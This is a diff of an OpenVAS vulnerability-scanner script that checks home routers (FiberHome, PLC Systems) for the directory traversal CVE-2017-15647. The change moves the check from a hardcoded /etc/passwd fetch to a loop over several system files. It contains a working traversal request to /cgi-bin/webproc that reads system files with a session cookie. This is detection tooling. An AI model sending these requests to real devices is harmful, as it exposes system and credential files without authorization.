@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_mult_router_dir_trav_vuln.nasl 9565 2018-04-23 10:00:20Z ckuersteiner $
+# $Id: gb_mult_router_dir_trav_vuln.nasl 11747 2018-10-04 09:58:33Z jschulte $
 #
 # Multiple Router Directory Traversal Vulnerability
 #
@@ -25,20 +25,20 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.140448");
-  script_version("$Revision: 9565 $");
-  script_tag(name: "last_modification", value: "$Date: 2018-04-23 12:00:20 +0200 (Mon, 23 Apr 2018) $");
-  script_tag(name: "creation_date", value: "2017-10-24 09:17:33 +0700 (Tue, 24 Oct 2017)");
+  script_version("$Revision: 11747 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-04 11:58:33 +0200 (Thu, 04 Oct 2018) $");
+  script_tag(name:"creation_date", value:"2017-10-24 09:17:33 +0700 (Tue, 24 Oct 2017)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 
   script_cve_id("CVE-2017-15647");
 
-  script_tag(name: "qod_type", value: "exploit");
+  script_tag(name:"qod_type", value:"exploit");
 
-  script_tag(name: "solution_type", value: "NoneAvailable");
+  script_tag(name:"solution_type", value:"NoneAvailable");
 
   script_name("Multiple Router Directory Traversal Vulnerability");
 
@@ -46,29 +46,31 @@ if (description)
 
   script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("gb_get_http_banner.nasl");
+  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
+  script_require_keys("Host/runs_unixoide");
   script_mandatory_keys("mini_httpd/banner");
   script_require_ports("Services/www", 8080);
 
-  script_tag(name: "summary", value: "Multiple home router products are prone to a directory traversal
-vulnerability.");
+  script_tag(name:"summary", value:"Multiple home router products are prone to a directory traversal
+  vulnerability.");
 
-  script_tag(name: "insight", value: "On multiple home router products (e.g. FiberHome, PLC Systems), a directory
-traversal vulnerability exists in /cgi-bin/webproc via the getpage parameter in conjunction with a crafted
-var:page value.");
+  script_tag(name:"insight", value:"On multiple home router products (e.g. FiberHome, PLC Systems), a directory
+  traversal vulnerability exists in /cgi-bin/webproc via the getpage parameter in conjunction with a crafted
+  var:page value.");
 
-  script_tag(name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response.");
+  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");
 
-  script_tag(name: "solution", value: "No solution or patch is available as of 23th April, 2018. Information
-regarding this issue will be updated once solution details are available.");
+  script_tag(name:"solution", value:"No known solution is available as of 31st July, 2018. Information
+  regarding this issue will be updated once solution details are available.");
 
-  script_xref(name: "URL", value: "https://blogs.securiteam.com/index.php/archives/3472");
+  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3472");
 
   exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port(default: 8080);
 
@@ -76,19 +78,26 @@ port = get_http_port(default: 8080);
 req = http_get(port: port, item: "/cgi-bin/webproc?getpage=html/index.html&errorpage=html/main.html&var:language=zh_cn&var:menu=setup&var:page=connected&var:retag=1&var:subpage=-");
 res = http_keepalive_send_recv(port: port, data: req);
 
+files = traversal_files("linux");
+
 cookie = get_cookie_from_header(buf: res, pattern: '(sessionid=[^;]+)');
 if (cookie) {
   cookie += "; language=en_us";
 
-  url = '/cgi-bin/webproc?getpage=/etc/passwd&amp;var:language=en_us&amp;var:page=wizardfifth';
+  foreach pattern(keys(files)) {
 
-  req = http_get_req(port: port, url: url, add_headers: make_array("Cookie", cookie));
-  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);
+    file = files[pattern];
 
-  if (res =~ 'root:.*:0:[01]:') {
-    report = "It was possible to optain the '/etc/passwd' file.\n\nResult:\n" + res;
-    security_message(port: port, data: report);
-    exit(0);
+    url = '/cgi-bin/webproc?getpage=/' + file + '&amp;var:language=en_us&amp;var:page=wizardfifth';
+
+    req = http_get_req(port: port, url: url, add_headers: make_array("Cookie", cookie));
+    res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);
+
+    if (egrep(string: res, pattern: pattern)) {
+      report = "It was possible to optain the '/" + file + "' file.\n\nResult:\n" + res;
+      security_message(port: port, data: report);
+      exit(0);
+    }
   }
 }
 
